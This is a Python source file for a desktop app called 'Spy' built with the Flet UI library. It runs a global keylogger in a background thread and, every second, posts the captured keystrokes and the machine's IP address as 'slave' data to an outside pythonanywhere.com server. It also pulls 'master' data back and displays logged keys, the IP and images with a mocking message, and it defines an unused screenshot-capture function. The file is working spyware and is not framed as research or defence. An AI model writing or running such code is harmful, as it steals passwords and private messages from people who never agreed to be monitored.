import flet as ft
import threading
import random
import requests
import time
from PIL import ImageGrab
import io
import base64
import socket
from pynput import keyboard
import google.generativeai as genai
import ast
import api
from PIL import Image

# Configure the AI model
client = genai.configure(api_key=api.key)

KeysPressed = []

# Keylogger setup
def on_press(key):
    global KeysPressed
    try:
        if key.char:
            KeysPressed.append(key.char)
    except AttributeError:
        KeysPressed.append(str(key))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=start_keylogger, daemon=True).start()

# Function to handle sending messages
def send_message(page, message=None, img_data=None):
    if img_data:
        img_control = ft.Image(src_base64=img_data, width=300)
        content = ft.Container(content=img_control, padding=10, bgcolor="#bbdefb", border_radius=10)
    else:
        content = ft.Container(content=ft.Text(f"{message}", color="black"), padding=10, bgcolor="#bbdefb", border_radius=10)

    chat_box.controls.append(ft.Card(content=content, elevation=2))
    page.update()

# Capture and encode screenshot
def screenshot_to_base64():
    screenshot = ImageGrab.grab()
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    return base64.b64encode(buffer.getvalue()).decode("utf-8")

# Ping server for data
def ping_server() -> list:
    global KeysPressed

    url = "https://swadheenmishra123.pythonanywhere.com/"
    payload = {"Type": "slave", "data": [KeysPressed, socket.gethostbyname(socket.gethostname())]}
    requests.post(url + "receive_data", json=payload)

    # Get response from server
    response = requests.get(url + "send_data?Type=master").json()['data']
    
    # Parse response properly
    try:
        parsed_data = ast.literal_eval(response)
        return parsed_data
    except Exception as e:
        print(f"Failed to parse server response: {e}")
        return [[], "", ""]

# Decode and return image data as base64
def decode_image(img_base64):
    if img_base64.startswith("data:image"):
        img_base64 = img_base64.split(",")[1]

    img_bytes = base64.b64decode(img_base64)
    return base64.b64encode(img_bytes).decode("utf-8")

# Handle display logic
def display_thread(p):
    while True:
        keys, ip, img = ping_server()

        if keys:
            send_message(p, message=f"Keys logged: {''.join(keys)}")
        
        if ip:
            send_message(p, f"This you lil bro? {ip}")

        if img:
            img_data = decode_image(img)
            send_message(p, img_data=img_data)

        time.sleep(1)

# Setup UI
def main(page: ft.Page):
    global user_input, chat_box
    page.title = "Spy 🕵🏻‍♀️"

    chat_box = ft.Column(scroll=ft.ScrollMode.ALWAYS)
    page.add(ft.Container(chat_box, expand=True))

    # Start data display thread
    threading.Thread(target=display_thread, args=[page], daemon=True).start()

ft.app(target=main)